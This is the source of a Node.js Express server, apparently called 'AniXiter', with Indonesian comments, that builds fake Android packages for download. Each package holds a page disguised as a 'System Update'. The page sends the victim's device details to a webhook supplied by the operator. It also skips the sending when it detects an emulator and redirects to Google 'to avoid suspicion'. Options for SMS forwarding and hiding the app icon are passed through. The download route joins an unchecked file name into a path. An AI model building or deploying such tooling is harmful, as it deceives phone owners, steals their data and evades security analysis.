// AniXiter | render-apk-builder
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs-extra');
const archiver = require('archiver');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const UPLOAD_DIR = path.join(__dirname, 'builds');
fs.ensureDirSync(UPLOAD_DIR);

// Endpoint untuk membangun APK
app.post('/api/build', async (req, res) => {
    try {
        const { appName, webhook, sessionId, sms_forward, accessibility, hide_icon, anti_emu } = req.body;
        
        if (!appName || !webhook || !sessionId) {
            return res.status(400).json({ error: 'Missing required parameters' });
        }

        const timestamp = Date.now();
        const buildId = `anixiter_${sessionId}_${timestamp}`;
        const workDir = path.join(UPLOAD_DIR, buildId);
        const outputDir = path.join(workDir, 'assets');
        const apkPath = path.join(UPLOAD_DIR, `${buildId}.apk`);

        // 1. Buat direktori kerja
        fs.ensureDirSync(outputDir);

        // 2. Buat payload HTML
        const htmlPayload = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>${appName}</title>
            <style>
                body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                .spinner { border: 4px solid #333; border-top: 4px solid #ff7a00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div>
                <div class="spinner"></div>
                <h2>Memuat System Update...</h2>
                <p style="color:#888;font-size:12px;">Mohon tunggu sebentar.</p>
            </div>
            <script>
                // Logika Exfiltration Data
                function sendData() {
                    const data = {
                        username: '${appName} Bot',
                        embeds: [{
                            title: '📱 Android Target Connected',
                            color: 16744448,
                            fields: [
                                { name: 'Session ID', value: '${sessionId}', inline: false },
                                { name: 'App Name', value: '${appName}', inline: true },
                                { name: 'User Agent', value: navigator.userAgent, inline: false },
                                { name: 'SMS Forward', value: '${sms_forward}', inline: true },
                                { name: 'Accessibility', value: '${accessibility}', inline: true },
                                { name: 'Hide Icon', value: '${hide_icon}', inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };

                    fetch('${webhook}', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).catch(e => console.error(e));

                    // Redirect setelah 3 detik untuk menghindari kecurigaan
                    setTimeout(() => { window.location.href = 'https://google.com'; }, 3000);
                }
                
                // Cek apakah target berada di emulator (jika anti_emu aktif)
                const isEmulator = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && navigator.hardwareConcurrency <= 4;
                if ('${anti_emu}' === 'true' && isEmulator) {
                    console.log('Emulator detected, aborting.');
                } else {
                    sendData();
                }
            </script>
        </body>
        </html>
        `;

        fs.writeFileSync(path.join(outputDir, 'index.html'), htmlPayload);

        // 3. Coba gunakan Base APK jika tersedia (untuk membuat APK yang bisa diinstal)
        const baseApkPath = path.join(__dirname, 'base.apk');
        if (fs.existsSync(baseApkPath)) {
            // Logika injeksi Base APK (memerlukan library tambahan seperti 'adm-zip')
            // Untuk saat ini, kita hanya akan menyalin base.apk sebagai output
            // Implementasi injeksi sesungguhnya memerlukan unzip, replace assets/index.html, zip ulang, dan sign ulang.
            console.log('Base APK ditemukan. Menyalin sebagai output (injeksi belum diimplementasikan penuh).');
            fs.copySync(baseApkPath, apkPath);
        } else {
            // Fallback: Buat file .zip yang di-rename menjadi .apk
            console.log('Base APK tidak ditemukan. Membuat ZIP payload.');
            await createZip(outputDir, apkPath);
        }

        // 4. Bersihkan direktori kerja
        setTimeout(() => { fs.removeSync(workDir); }, 60000); // Hapus setelah 1 menit

        // 5. Kembalikan URL unduhan
        const downloadUrl = `${req.protocol}://${req.get('host')}/downloads/${buildId}.apk`;
        res.json({ url: downloadUrl });

    } catch (error) {
        console.error('Build Error:', error);
        res.status(500).json({ error: 'Internal server error during build' });
    }
});

// Fungsi untuk membuat ZIP
function createZip(sourceDir, outputPath) {
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(outputPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        output.on('close', resolve);
        archive.on('error', reject);

        archive.pipe(output);
        archive.directory(sourceDir, false);
        archive.finalize();
    });
}

// Endpoint untuk mengunduh file
app.get('/downloads/:file', (req, res) => {
    const file = path.join(UPLOAD_DIR, req.params.file);
    if (fs.existsSync(file)) {
        res.download(file);
    } else {
        res.status(404).send('File not found');
    }
});

// Route dasar untuk kesehatan
app.get('/', (req, res) => {
    res.send('AniXiter APK Builder is running.');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[AniXiter] Builder berjalan di port ${PORT}`);
});
